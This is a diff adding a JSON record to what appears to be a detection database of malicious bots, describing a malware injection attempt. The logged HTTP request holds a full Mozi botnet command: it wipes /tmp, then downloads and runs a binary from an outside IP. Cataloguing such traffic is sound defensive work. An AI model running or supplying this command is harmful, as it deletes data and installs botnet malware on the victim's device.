@@ -1,0 +1,19 @@
+{
+  "category": 99,
+  "comments": "",
+  "country": "",
+  "description": "Anomalous user agent from a malware injection attempt.",
+  "http_requests": [
+    "GET /shell?cd+/tmp;rm+-rf+*;wget+http://111.43.223.103:35300/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1"
+  ],
+  "id": "Hello, world",
+  "known_cidrs": [],
+  "last_updated": "2020-08-06",
+  "robotstxt": "no",
+  "type": 99,
+  "user_agents": ["Hello, world"],
+  "website": {
+    "reachable": false,
+    "url": ""
+  }
+}
